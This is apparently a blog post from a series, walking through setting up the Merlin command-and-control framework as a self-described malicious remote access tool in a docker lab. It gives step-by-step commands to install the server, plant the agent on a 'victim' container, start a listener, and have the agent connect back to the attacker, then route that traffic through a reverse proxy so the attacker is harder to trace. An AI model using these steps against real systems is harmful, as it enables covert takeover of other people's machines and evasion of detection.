---
title: Time for RAT.
description: Draft
date: 2021-07-02
scheduled: 2021-07-02
layout: layouts/post.njk
tags:
    - posts
---

We have our Attacker server ready, we have our Reverse-Proxy ready, and we have encrypted HTTPS communication.
### It's time for our RAT.
A RAT is a Remote Access Tool. They can be used in a number of positive ways like Windows Remote Control or SSH sessions. Our RAT is going to be malicious though. We're going to control our Victim's system from our Attacker and by using a Reverse-Proxy and SSL we'll be masked and hidden, impossible to trace. Well, not really. But it won't be easy! (We'll try that later.)

First let's get our tools.
Download wget and 7zip onto our Attacker:

``` bash 
apt install wget
apt-get install p7zip-full
```

Next let's get ![Merlin](https://github.com/Ne0nd0g/merlin).
Merlin is a cross-platform post-exploitation Command & Control server and agent written in Go.
We'll create a directory for it and unpack it using 7zip, as per instructions on the ![official site](https://merlin-c2.readthedocs.io/en/latest/quickStart/server.html).

``` bash
mkdir /opt/merlin;cd /opt/merlin
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z
./merlinServer-Linux-x64
```

![Merlin](/img/remote/merlin.png)

Let's close it for now though, you can do that with `exit` command.

Merlin consists of the server part, which we just saw, and an agent. An agent will sit in our victim, waiting for the server's instructions and executing them. We already have three precompiled agents for each of the big platforms, Windows, Linux and MacOS.
Navigate into `/opt/merlin/data/bin/linux` and you'll find `merlinAgent-Linux-x64`.

Merlin is a post-exploitation framework, meaning it isn't within the scope of the program to get the agent onto our victim. There are plenty ways for that which I won't try to cover. Let's just copy and paste it into our victim.
First, find the Attacker's and Victim's docker container ID's.

``` bash
docker ps 
```
Now we'll copy the agent from our attacker to our desktop and then from our desktop to our victim.

``` bash
docker cp 75566028d8fb:/opt/merlin/data/bin/linux/merlinAgent-Linux-x64 ~/Desktop/merlinAgent-Linux-x64
docker cp ~/Desktop/merlinAgent-Linux-x64 b9d55696b755:/merlinAgent-Linux-x64
```

Now, we're ready! Let's just check out how Merlin server and Agent work together.
Inside attacker start up Merlin. It's worth mentioning that Merlin has tab completion so if you're unsure about the availeable commands just hit TAB and it'll show you.
Let's use HTTP2.

``` bash
listeners
use http2
options
```

We'll see the defaults now. We'll need to change some of them.
![Merlin options](/img/remote/merlin-options1.png)

Let's use the IP of our container and the port 5555 we've specified earlier and start up our listener.

``` bash
set Interface 172.17.0.3
set Port 5555
start
```

Now we have to connect to our listener with our agent.
Go to victim, navigate to where the agent is, and enter the following:

``` bash
./merlinAgent-Linux-x64 -v -url https://172.17.0.3:5555 -psk 'merlin'
```
With the verbose `-v` flag you should see everything the agent is doing, and on the other side, in our Merlin server, you should see the connection.
Now you have a full control over victim from attacker.
Try our a simple `ls` to get a list of files.

![Merlin ls](/img/remote/merlin-ls.png)

Feels good!

Now let's route the commands through our reverse proxy.
Close the agent with a CTRL + C and enter the following:

``` bash
./merlinAgent-Linux-x64 -v -url https://172.17.0.4/merlin -psk 'merlin'
```

This time we're using the IP of our reverse-proxy, and it still connects!
We'll be using those two scenarios, with and without the reverse-proxy, in the next post.